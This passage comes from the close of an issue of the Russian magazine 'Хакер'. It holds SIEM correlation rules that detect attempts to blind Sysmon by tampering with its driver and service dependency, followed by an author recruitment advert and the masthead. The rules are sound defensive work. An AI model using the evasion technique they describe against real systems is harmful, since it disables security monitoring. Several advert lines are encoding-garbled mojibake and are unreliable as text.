            event_src.title == "sysmon" and
            msgid == "13" )
        ) and
        in_list(["create", "modify"], lower(action)) == True and
        regex(object.path, "sysmon64", 0) != null and
        lower(object.name) == "dependonservice"
    }


 event SysmonDrv_WriteError:
    key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and
        event_src.title == "sysmon" and
        msgid == "255" and
        lower(object.name) == "getconfigurationoptions" and
        regex(lower(reason), "failed.*configuration.*error.94.*(
запис|write)", 0) != null
    }


rule Create_fake_SysmonDrv_symlink: (MalwareService_Created* ->
SysmonDepend_Created within 20s) or (SysmonDrv_WriteError+ ->
SysmonDrv_WriteError)

Правило Elastic SIEM.





ВЫВОДЫ

В этом материале мы рассмотрели разные способы детекта воздействий
на ядерную подсистему Sysmon, а точнее, на взаимодействие службы Sysmon
с ее драйвером. В следующем материале мы разберем техники обнаружения
манипуляций с подсистемой ETW. До новых встреч!
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №6 (303)

            Андрей Письменный      Валентин Холмогоров        Илья Русанен
               Главный редактор         Ведущий редактор                Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                          Евгения Шарипова           yambuto
                            Литературный редактор          Бильд‑редактор
                                                   yambuto@gmail.com


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий‑Стем‐
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                           Вопросы о подписке:        ​Вопросы о материалах:
                                 lapina@glc.ru                support@glc.ru​





Учредитель: ИП Яковлева Анна Вадимовна ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Московская область,
Пушкино, мкр Софрино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегистрировано Федеральной службой по надзору в сфере связи,
информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация к размышлению. Лица,
использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2024